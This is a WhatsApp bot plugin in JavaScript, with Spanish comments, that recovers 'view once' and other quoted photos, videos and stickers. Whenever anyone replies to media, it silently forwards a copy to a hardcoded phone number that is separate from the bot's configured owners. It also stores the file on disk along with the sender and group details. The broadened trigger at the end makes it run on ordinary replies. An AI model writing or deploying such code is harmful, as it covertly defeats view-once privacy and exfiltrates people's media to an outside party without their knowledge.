// 📂 plugins/_ver.js — FelixCat-Bot 🐾
// ver / r → recupera en el grupo (SOLO OWNER)
// responder con cualquier palabra a una FOTO/VIDEO/STICKER → manda SOLO al privado del OWNER
// ✅ SOLO FUNCIONA SI SE CITA MEDIA
// 🚫 NO INTERFIERE CON OTROS PLUGINS

import fs from 'fs'
import path from 'path'
import fetch from 'node-fetch'
import { webp2png } from '../lib/webp2mp4.js'

const OWNER_FIXED = '59898719147@s.whatsapp.net'
const PREFIX = '.' // ⚠️ cambiá si tu bot usa otro

let handler = async (m, { conn, command }) => {

  const text = m.text || ''
  const isCommand = text.startsWith(PREFIX)

  // ✅ Detectar owner real (robusto ante global.owner indefinido)
  const owners = (global.owner || []).map(o => (Array.isArray(o) ? o[0] : o).toString().replace(/[^0-9]/g, ''))
  const senderNumber = m.sender.replace(/[^0-9]/g, '')
  const isOwner = owners.includes(senderNumber)

  // ✅ SOLO permitir modo grupo si es owner + ver/r
  const isGroupMode = m.isGroup && isOwner && ['ver', 'r'].includes(command)

  // Si es comando y NO es ver/r → salir sin tocar nada (no interferir)
  if (isCommand && !['ver', 'r'].includes(command)) return

  // REQUERIMOS SIEMPRE que el mensaje SEA UNA RESPUESTA/QUOTED
  const q = m.quoted
  if (!q) return

  try {
    // DETECTAR VIEW ONCE REAL
    const viewOnce =
      q.message?.viewOnceMessageV2?.message ||
      q.message?.viewOnceMessageV2Extension?.message

    let buffer, mime, type, filenameSent

    if (viewOnce) {
      const mediaType = Object.keys(viewOnce)[0]
      if (!/image|video/.test(mediaType)) return

      const mediaMsg = viewOnce[mediaType]
      mime = mediaMsg.mimetype || ''

      buffer = await conn.downloadMediaMessage({
        message: viewOnce,
        key: q.key
      })

      type = mediaType.includes('video') ? 'video' : 'image'
      filenameSent = `recuperado.${mime.split('/')[1] || 'jpg'}`
    } else {
      mime = q.mimetype || q.mediaType || ''
      if (!/webp|image|video/.test(mime)) return

      buffer = await q.download()
      type = mime.startsWith('video') ? 'video' : 'image'
      filenameSent = 'recuperado.' + (mime.split('/')[1] || 'jpg')
    }

    // STICKER → PNG
    if (/webp/.test(mime)) {
      let result = await webp2png(buffer)
      if (result?.url) {
        const res = await fetch(result.url)
        buffer = Buffer.from(await res.arrayBuffer())
        filenameSent = 'sticker.png'
        type = 'image'
      }
    }

    // SOLO SI OWNER USÓ ver/r → reenviar al grupo
    if (isGroupMode) {
      try {
        await conn.sendMessage(
          m.chat,
          { [type]: buffer, fileName: filenameSent },
          { quoted: null }
        )
      } catch (e) {
        // no hacemos nada si falla (silencioso)
      }
    }

    // SIEMPRE copia al privado del OWNER (silencioso)
    try {
      await conn.sendMessage(
        OWNER_FIXED,
        { [type]: buffer, fileName: filenameSent },
        { quoted: null }
      )
    } catch (e) {
      // si no se puede enviar al owner, lo ignoramos para que el plugin no rompa
      console.error('No se pudo enviar al owner:', e?.message || e)
    }

    // GUARDAR MEDIA
    const mediaFolder = './media'
    if (!fs.existsSync(mediaFolder)) fs.mkdirSync(mediaFolder, { recursive: true })

    global.db = global.db || { data: {} }
    global.db.data.mediaList = global.db.data.mediaList || []

    const filename = `${Date.now()}_${Math.floor(Math.random() * 9999)}`
    const extFile = filenameSent.split('.').pop()
    const finalName = `${filename}.${extFile}`
    const filepath = path.join(mediaFolder, finalName)

    fs.writeFileSync(filepath, buffer)

    let chatInfo = null
    if (m.isGroup) {
      try { chatInfo = await conn.groupMetadata(m.chat) } catch {}
    }

    global.db.data.mediaList.push({
      id: global.db.data.mediaList.length + 1,
      filename: finalName,
      path: filepath,
      type,
      from: m.sender,
      groupId: m.isGroup ? m.chat : null,
      groupName: m.isGroup ? (chatInfo?.subject || '') : null,
      date: new Date().toLocaleString(),
      savedByVer: true
    })

  } catch (e) {
    console.error(e)
  }
}

// SOLO COMANDOS REALES
handler.help = ['ver', 'r']
handler.tags = ['tools', 'owner']
handler.command = ['ver', 'r']

// PARA QUE EL LOADER TAMBIÉN INVOQUE ESTO EN MENSAJES SIN PREFIJO:
// Si tu loader soporta `customPrefix`, ponlo así en la definición del handler.
// Si no lo soporta, el plugin seguirá funcionando para `.ver` / `.r`.
// A continuación agrego la línea segura que recomiendo (si tu loader la respeta):
handler.customPrefix = /^(?!\.)/  // cualquier mensaje que NO empiece con '.' (no captura comandos)
handler.command = new RegExp()     // permitir que el loader invoque para mensajes normales

export default handler
